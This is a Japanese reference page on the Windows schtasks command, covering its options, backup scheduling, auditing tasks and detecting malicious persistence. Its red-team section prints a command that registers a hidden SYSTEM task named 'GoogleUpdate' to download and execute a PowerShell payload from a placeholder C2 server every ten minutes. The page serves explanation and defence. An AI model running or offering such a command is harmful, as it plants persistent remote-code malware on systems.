# `schtasks` - タスクのスケジュールを設定する

## 概要

`schtasks` コマンドは、Windowsの**タスクスケジューラ**をコマンドラインから操作するためのツールです。このコマンドを使うことで、特定の時間、日、週、月、あるいはシステム起動時やユーザーログオン時などのイベントをトリガーとして、プログラムやスクリプトを自動実行する「スケジュールタスク」を管理できます。システムのメンテナンス作業の自動化から、攻撃者による永続化まで、非常に幅広く利用されます。

(出自: `Windows標準搭載`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| **`at`** | `schtasks` の前身となった古いコマンド。機能が限定的であり、現在は非推奨です。全ての機能は `schtasks` に引き継がれています。 | `schtasks` |
| **PowerShell** | `Get-ScheduledTask`, `Register-ScheduledTask`, `Set-ScheduledTask` などのコマンドレットは、タスクをオブジェクトとして扱え、より複雑なトリガーやアクションを設定できるため、高度な自動化に適しています。 | `*-ScheduledTask` (PowerShell) |

## よく連携されるコマンド

`schtasks` は、それ自体が他のコマンドやスクリプト（`.bat`, `.ps1`など）を実行するためのラッパーとして機能します。

### シナリオ例: 夜間バッチ処理の自動化 (インフラ構築・運用視点)

* **目的**: 毎日深夜1時に、バックアップ用のバッチスクリプト `D:\Scripts\backup.bat` を自動実行するタスクを作成する。
* **連携コマンド**: (実行対象としてのバッチファイル)
* **解説**: `/Create` を使って新しいタスクを作成し、`/SC DAILY` でスケジュールを「毎日」、`/ST 01:00` で時刻を「01:00」、`/TR` で実行するプログラムを指定します。`/RU SYSTEM` でSYSTEM権限で実行するように設定するのが一般的です。
* **コマンド例**:

    ```cmd
    REM "Daily Backup" という名前で毎日深夜1時にbackup.batを実行するタスクを作成
    schtasks /Create /TN "Daily Backup" /TR "D:\Scripts\backup.bat" /SC DAILY /ST 01:00 /RU SYSTEM /F
    ```

## スイッチ/オプション説明

`schtasks` は `schtasks /<operation> [arguments]` の形式で使用します。

| 操作 (Operation) | 説明 |
| :--- | :--- |
| ⭐ **`/Create`** | 新しいスケジュールタスクを作成します。 |
| ⭐ **`/Query`** | 登録されている全てのタスクを照会します。 |
| ⭐ **`/Delete`** | スケジュールタスクを削除します。 |
| **`/Run`** | スケジュールとは無関係に、タスクを即時実行します。 |
| **`/End`** | 現在実行中のタスクを停止します。 |
| **`/Change`** | タスクのプロパティを変更します。 |

| 主なパラメータ (`/Create`で使用) | 説明 |
| :--- | :--- |
| ⭐ `/TN <TaskName>` | タスクの名前を指定します。 |
| ⭐ `/TR <TaskRun>` | タスクが実行するプログラムやスクリプトのパスと引数を指定します。 |
| ⭐ `/SC <Schedule>` | スケジュールの種類を指定します (`MINUTE`, `HOURLY`, `DAILY`, `WEEKLY`, `MONTHLY`, `ONCE`, `ONSTART`, `ONLOGON`, `ONIDLE`)。 |
| `/ST <StartTime>` | タスクの開始時刻を `HH:mm` 形式で指定します。 |
| `/RU <User>` | タスクを実行するユーザーアカウントを指定します (`SYSTEM` や `domain\user`など)。 |
| `/RP <Password>` | `/RU` で指定したユーザーのパスワード。 |
| `/F` | タスクが既に存在する場合に、警告なしで上書きします。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 現在システムに登録されている全てのタスクとその詳細をCSV形式で出力して監査する。
* **組み合わせ**: `/Query /FO CSV /V`
* **解説**: `/FO CSV` で出力をCSV形式に、`/V` で詳細情報を表示します。これにより、Excelなどで簡単にソートやフィルタリングができ、タスクの一覧性が向上します。
* **例**:

    ```cmd
    REM 全てのタスクの詳細を scheduled_tasks.csv として保存
    schtasks /Query /FO CSV /V > scheduled_tasks.csv
    ```

### 2. ブルーチーム視点

* **タスク**: **永続化されたマルウェアの発見**。システムに登録されている不審なタスクを調査する。
* **組み合わせ**: `/Query /FO LIST /V`
* **解説**: **インシデント対応の基本**。`schtasks /Query` の結果を精査し、見慣れないタスク名、`Task To Run` (実行コマンド) が不審なパス（例: `C:\Users\Public`）を指していないか、`Run As User` が予期せぬアカウントになっていないかなどを確認します。
* **例**:

    ```cmd
    REM 全てのタスクの詳細をリスト形式で表示し、内容を精査
    schtasks /Query /FO LIST /V
    ```

### 3. レッドチーム視点

* **タスク**: **永続化 (Persistence)** のため、C2サーバーに接続するリバースシェルを定期的に実行するタスクを作成する。
* **組み合わせ**: `/Create`
* **解説**: 攻撃者は管理者権限を奪取した後、`schtasks` を使って自身のペイロードが定期的に（例: 1時間ごと）実行されるようにタスクを登録します。`SYSTEM` 権限で実行させることで、高い権限での活動を維持します。これは最も一般的で強力な永続化の手法です。
* **例**:

    ```cmd
    REM 10分ごとに悪意のあるPowerShellコマンドを実行するタスク 'GoogleUpdate' を作成
    schtasks /Create /SC MINUTE /MO 10 /TN "GoogleUpdate" /TR "powershell.exe -WindowStyle hidden -nop -c 'iex(new-object net.webclient).downloadstring(''http://<C2_SERVER>/payload.ps1'')'" /RU SYSTEM /F
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `ERROR: Access is denied.`
    * **考えられる原因**: タスクの作成、削除、変更には管理者権限が必要です。
    * **解決策**: コマンドプロンプトを「管理者として実行」して、再度コマンドを実行してください。

## 環境変数と設定ファイル

* タスクの定義は、`C:\Windows\System32\Tasks` ディレクトリ配下にXMLファイルとして保存されます。
* 一般的な環境変数は、[CMD共通の環境変数・設定ファイル](./environment_and_config.md)で解説。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `schtasks` 自体ではなく、**タスクの不正な登録**が重大なセキュリティリスクとなります。
* **悪用シナリオ**: レッドチームのシナリオで述べた通り、`schtasks` は攻撃者がシステムへの永続的なアクセスを確保するための最も一般的な手法の1つです。システム起動時、ユーザーログオン時、あるいは定期的に悪意のあるコードを実行させることができます。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: **永続化 (Persistence)**, **権限昇格 (Privilege Escalation)**, **コード実行 (Execution)**
* **参照**: [https://lolbas-project.github.io/lolbas/Binaries/Schtasks/](https://lolbas-project.github.io/lolbas/Binaries/Schtasks/)
* **解説**: `schtasks.exe` は、攻撃者がシステムに深く潜伏し、活動を維持するために利用する、極めて重要な環境寄生型バイナリです。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 最小権限の原則を徹底し、一般ユーザーにタスクの作成・変更権限を与えない。
* **Detection (検知)**: Windows セキュリティイベントログで、**新しいタスクの作成 (イベントID 4698)**、タスクの削除 (4699)、タスクの更新 (4702) を厳重に監視する。`schtasks.exe` の実行、特に `/Create` コマンドをプロセス監査ログで監視する。

## 注意点・補足

* **実行権限**: `/RU` で指定するアカウントには、「バッチジョブとしてログオン」の権限が必要です。`SYSTEM` を指定するのが最も確実ですが、最小権限の観点からは専用のサービスアカウントを作成することが望ましいです。
